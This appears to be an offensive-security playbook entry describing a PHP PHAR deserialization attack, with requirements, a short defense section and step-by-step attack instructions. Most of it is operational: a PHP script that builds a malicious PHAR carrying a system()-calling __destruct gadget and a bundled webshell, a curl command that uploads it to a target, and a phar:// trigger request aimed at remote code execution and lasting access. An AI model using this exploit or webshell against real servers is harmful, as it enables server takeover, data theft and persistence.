# Phar-Deserialization-Attack

## Summary

The Phar Deserialization Attack exploits unsafe unserialization in PHP applications by crafting a malicious PHAR archive and using the phar:// stream wrapper to trigger deserialization of its metadata, leading to remote code execution (RCE) via gadget chains in the application's framework.

## Description

PHP's PHAR extension allows creating self-contained archives that can include serialized PHP objects in their metadata. When a vulnerable application uses functions like file_get_contents() or include() on user-controlled input with the phar:// wrapper (e.g., file_get_contents($_GET['path'])), accessing the archive deserializes the metadata. If the application uses a framework with exploitable gadget chains (e.g., __destruct or __wakeup methods that execute code), this can lead to arbitrary command execution on the server. This technique targets web applications with file upload features and deserialization sinks, often resulting in server compromise, data access, or persistence. It requires identifying a deserialization vulnerability and a suitable property-oriented programming (POP) chain for the target framework.

## Requirements

1. A PHP web application vulnerable to deserialization, such as one that unserializes data read from user-supplied file paths (e.g., unserialize(file_get_contents($_GET['data']))).
2. File upload capability on the target to place the malicious PHAR archive in an accessible directory (e.g., /uploads/).
3. Knowledge of a POP gadget chain for the target's PHP framework or libraries (e.g., for Laravel, Symfony; tools like phpggc can generate these).
4. Network access to the target web server and a local PHP environment (version matching the target) for crafting the payload.

## Defense

- Disable the phar:// stream wrapper or sanitize inputs to block 'phar://' patterns using allow_url_fopen=false or wrappers validation.
- Use unserialize() with the allowed_classes parameter set to false to prevent object deserialization.
- Implement input validation to restrict file paths and avoid unserializing user-controlled data; prefer JSON or safe formats.
- Deploy a web application firewall (WAF) to detect and block requests containing 'phar://' or suspicious serialized payloads.
- Keep PHP and frameworks updated, and use tools like PHPStan or static analysis to identify deserialization sinks.

## Objectives

1. Upload a malicious PHAR archive to the target server.
2. Trigger deserialization via the phar:// wrapper to execute arbitrary code.
3. Achieve RCE, such as running system commands or dropping a webshell for further access.

## Instructions

### Step 1: Craft Malicious PHAR Archive

**Context**: Create a PHAR archive with a serialized object in its metadata that executes code on deserialization (via __destruct) and include a simple webshell file for post-exploitation. This step requires a basic gadget; in practice, use a framework-specific chain generated by tools like phpggc.

Run the following PHP script locally to generate the archive (save as create_phar.php and execute with `php create_phar.php`):

```php
<?php
class Backdoor {
    public function __destruct() {
        if (isset($_GET['cmd'])) {
            system($_GET['cmd']);
        }
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>');
$backdoor = new Backdoor();
$phar->setMetadata($backdoor);
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
echo "Malicious PHAR created: exploit.phar\n";
?>
```

**Expected Output**: A file named `exploit.phar` is created in the current directory, containing the webshell and malicious metadata.

**Success Indicators**:
- PHAR file generated without errors.
- Verify with `phar info exploit.phar` or by checking file size >0.

### Step 2: Upload PHAR Archive to Target

**Context**: Use the target's file upload endpoint to place the malicious archive in a web-accessible directory, enabling the phar:// wrapper to reference it.

**Command** ([[commands/curl-upload-phar-to-target]]):

```bash
curl -F "file=@$_LOCAL_PHAR_PATH" "$_TARGET_UPLOAD_URL"
```

> This uploads the local PHAR file to the server. Replace placeholders with actual values (e.g., $_LOCAL_PHAR_PATH=exploit.phar, $_TARGET_UPLOAD_URL=http://target.com/upload.php).

**Expected Output**: HTTP 200 OK response confirming upload, or redirected to success page; check server logs or directory listing if possible.

**Success Indicators**:
- File appears in target directory (e.g., http://target.com/uploads/exploit.phar returns binary data).
- No upload restrictions (e.g., .phar extension allowed).

### Step 3: Trigger Deserialization for RCE

**Context**: Send a crafted request to the vulnerable deserialization endpoint, using the phar:// wrapper to access the uploaded archive. This deserializes the metadata, invoking the gadget chain for code execution.

**Command** ([[commands/curl-trigger-phar-deserialization]]):

```bash
curl "$_TARGET_VULN_URL?file=phar://uploads/$_PHAR_NAME/cmd=id"
```

> This triggers the deserialization; the /cmd=id accesses the added file and passes a command if the gadget supports it. Adjust the parameter name (e.g., 'file', 'path') based on the vuln.

**Expected Output**: Output of the executed command (e.g., 'uid=33(www-data) gid=33(www-data)' for 'id'), or evidence of execution like a touched file if using touch('/tmp/pwned').

**Success Indicators**:
- Command output in response body.
- Server-side effects (e.g., /tmp/pwned exists, or webshell responds to further requests).
